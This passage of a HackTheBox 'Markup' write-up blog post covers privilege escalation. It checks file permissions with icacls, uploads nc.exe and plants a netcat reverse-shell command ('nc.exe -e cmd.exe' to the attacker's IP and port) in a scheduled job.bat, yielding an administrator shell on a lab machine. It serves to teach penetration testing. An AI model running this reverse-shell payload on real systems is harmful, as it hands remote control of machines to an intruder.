+<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls" target="_blank" rel="noopener noreffer ">Microsoft - icacls</a></li>
+<li><a href="https://superuser.com/questions/364083/windows-list-files-and-their-permissions-access-in-command-line" target="_blank" rel="noopener noreffer ">superuser - windows list file permission</a></li>
+<li><a href="https://www.geeksforgeeks.org/basics-of-batch-scripting/" target="_blank" rel="noopener noreffer ">GeeksforGeeks - basic of batch scripting</a></li>
+</ul>
+</li>
+<li>
+<p>I&rsquo;m going to run this command</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">icacls job.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/markup/icacls.png" title="checking file permission" data-thumbnail="/posts/htb/markup/icacls.png" data-sub-html="<h2>checking file permission</h2><p>checking file permission</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/icacls.png"
+            data-srcset="/posts/htb/markup/icacls.png, /posts/htb/markup/icacls.png 1.5x, /posts/htb/markup/icacls.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/icacls.png" width="622" height="297" />
+    </a><figcaption class="image-caption">checking file permission</figcaption>
+    </figure></p>
+<ul>
+<li>we&rsquo;ve got <code>full access</code> to that file</li>
+<li>remember we&rsquo;re still <code>daniel</code></li>
+<li>Let&rsquo;s get the shell</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="ncexe">nc.exe</h3>
+<ul>
+<li>Let&rsquo;s get the <code>reverse shell</code>.</li>
+<li>First, we need to upload <code>nc.exe</code> into the machine</li>
+</ul>
+<blockquote>
+<p><font color="yellow">Windows do not come with nc installed. So, we need to upload it</font></p>
+</blockquote>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/awang_2.png" title="transfer nc.exe" data-thumbnail="/posts/htb/markup/awang_2.png" data-sub-html="<h2>transfer nc.exe</h2><p>transfer nc.exe</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/awang_2.png"
+            data-srcset="/posts/htb/markup/awang_2.png, /posts/htb/markup/awang_2.png 1.5x, /posts/htb/markup/awang_2.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/awang_2.png" width="1017" height="690" />
+    </a><figcaption class="image-caption">transfer nc.exe</figcaption>
+    </figure></p>
+<ul>
+<li>First, let&rsquo;s start our <code>nc for listening to the connection</code></li>
+<li>Then, put this payload in <code>job.bat</code></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">c:</span><span class="p">\</span><span class="nb">log-management</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">43</span> <span class="mf">9901</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/markup/tulis.png" title="put the payload in job.bat file" data-thumbnail="/posts/htb/markup/tulis.png" data-sub-html="<h2>put the payload in job.bat file</h2><p>put the payload in job.bat file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/tulis.png"
+            data-srcset="/posts/htb/markup/tulis.png, /posts/htb/markup/tulis.png 1.5x, /posts/htb/markup/tulis.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/tulis.png" width="1040" height="475" />
+    </a><figcaption class="image-caption">put the payload in job.bat file</figcaption>
+    </figure></p>
+<ul>
+<li>the result</li>
+<li>we&rsquo;ve got the <code>shell</code> and own the box</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/yes.png" title="shell as administrator" data-thumbnail="/posts/htb/markup/yes.png" data-sub-html="<h2>shell as administrator</h2><p>shell as administrator</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/yes.png"
+            data-srcset="/posts/htb/markup/yes.png, /posts/htb/markup/yes.png 1.5x, /posts/htb/markup/yes.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/yes.png" width="576" height="363" />
+    </a><figcaption class="image-caption">shell as administrator</figcaption>
+    </figure></p>
+<h3 id="admin-flag">Admin Flag</h3>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/root.png" title="root flag" data-thumbnail="/posts/htb/markup/root.png" data-sub-html="<h2>root flag</h2><p>root flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/root.png"
+            data-srcset="/posts/htb/markup/root.png, /posts/htb/markup/root.png 1.5x, /posts/htb/markup/root.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/root.png" width="564" height="390" />
+    </a><figcaption class="image-caption">root flag</figcaption>
+    </figure></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I&rsquo;ve learned a lot today. The XXE is so cool and it also can be dangerous if the input is not properly configured. Talk about &ldquo;configure&rdquo;. The file admin can run also need to configure properly in this case file called job.bat. Once again, don&rsquo;t use the same password.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 06-08-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/markup/" data-title="HackTheBox - Markup Writeup" data-via="_shafiqaiman_" data-hashtags="xxe,xxe-read-file,icacls,checking-file-permission-windows"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/markup/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/markup/" data-title="HackTheBox - Markup Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/markup/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/xxe/">xxe</a>,&nbsp;<a href="/tags/xxe-read-file/">xxe-read-file</a>,&nbsp;<a href="/tags/icacls/">icacls</a>,&nbsp;<a href="/tags/checking-file-permission-windows/">checking-file-permission-windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/included/" class="prev" rel="prev" title="HackTheBox - Included Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Included Writeup</a>
+            <a href="/posts/htb/guard/" class="next" rel="next" title="HackTheBox - Guard Writeup">HackTheBox - Guard Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
